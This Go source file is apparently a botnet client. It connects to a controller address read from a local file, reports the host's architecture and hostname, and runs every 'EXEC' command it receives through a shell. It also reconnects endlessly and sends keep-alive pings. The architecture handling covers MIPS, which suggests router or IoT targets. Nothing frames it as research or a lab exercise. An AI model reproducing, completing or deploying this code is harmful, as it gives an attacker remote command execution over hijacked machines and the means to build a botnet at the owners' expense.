package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"time"
)

const defaultAddress = "localhost:8080"
const beatInterval = 15 * time.Second
const retryInterval = 500 * time.Microsecond

func readAddress() string {
	for _, p := range []string{"address.txt", filepath.Join("abots", "address.txt")} {
		data, err := os.ReadFile(p)
		if err != nil {
			continue
		}
		addr := strings.TrimSpace(string(data))
		if addr != "" {
			return addr
		}
	}
	return defaultAddress
}

func archName() string {
	switch runtime.GOARCH {
	case "amd64":
		return "x86_64"
	case "386", "i386", "i686":
		return "x86"
	case "mipsle", "mips64", "mips64le":
		return "mips"
	default:
		return runtime.GOARCH
	}
}

func machine() string {
	if h, err := os.Hostname(); err == nil && h != "" {
		return h
	}
	return "bot"
}

func execLine(line string) {
	line = strings.TrimSpace(line)
	if !strings.HasPrefix(line, "EXEC ") {
		return
	}
	cmd := strings.TrimPrefix(line, "EXEC ")
	fmt.Printf("[bot] executing: %s\n", cmd)
	out, err := exec.Command("sh", "-c", cmd).CombinedOutput()
	if err != nil {
		fmt.Printf("[bot] exec failed: %v\n%s", err, out)
		return
	}
	fmt.Printf("[bot] done\n%s", out)
}

func connect(addr string) error {
	conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
	if err != nil {
		return err
	}
	defer conn.Close()

	fmt.Printf("[bot] connected to %s\n", addr)

	ident := fmt.Sprintf("BEAT %s %s\n", archName(), machine())
	if _, err := fmt.Fprint(conn, ident); err != nil {
		return err
	}

	r := bufio.NewReader(conn)
	for {
		conn.SetReadDeadline(time.Now().Add(beatInterval))
		line, err := r.ReadString('\n')
		if err != nil {
			if ne, ok := err.(net.Error); ok && ne.Timeout() {
				if _, err := fmt.Fprint(conn, "PING\n"); err != nil {
					return err
				}
				continue
			}
			return err
		}
		go execLine(line)
	}
}

func main() {
	addr := readAddress()
	fmt.Printf("[bot] heartbeat target: %s\n", addr)
	for {
		if err := connect(addr); err != nil {
			fmt.Printf("[bot] heartbeat lost on %s: %v\n", addr, err)
		}
		time.Sleep(retryInterval)
	}
}